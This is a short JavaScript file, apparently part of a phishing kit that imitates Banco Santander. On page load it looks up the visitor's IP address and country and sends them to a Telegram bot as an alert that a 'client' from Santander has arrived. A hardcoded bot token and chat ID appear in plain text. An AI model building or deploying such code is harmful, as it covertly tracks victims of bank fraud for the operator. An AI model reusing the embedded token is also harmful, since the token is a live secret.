const telegramToken = "6604007507:AAHEnjRE9QBLt7lusrsTcCx243NtTelJFmg";
const telegramChatId = "-1002037208917";

function enviarMensajeTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  
    axios.post(url, {
      chat_id: telegramChatId,
      text: mensaje
    })
    .then(response => {
      console.log("Mensaje enviado a Telegram");
    })
    .catch(error => {
      console.error("Error al enviar mensaje a Telegram:", error);
    });
  }
  
  window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const pais = data.country_name;
        const mensajeAlerta = `Alerta 🚨 Cliente detectado desde BANCO SANTANDER la siguiente IP: ${ip} (${pais})`;
  
        setTimeout(() => {
          enviarMensajeTelegram(mensajeAlerta);
        }, 2000);
      });
  });
  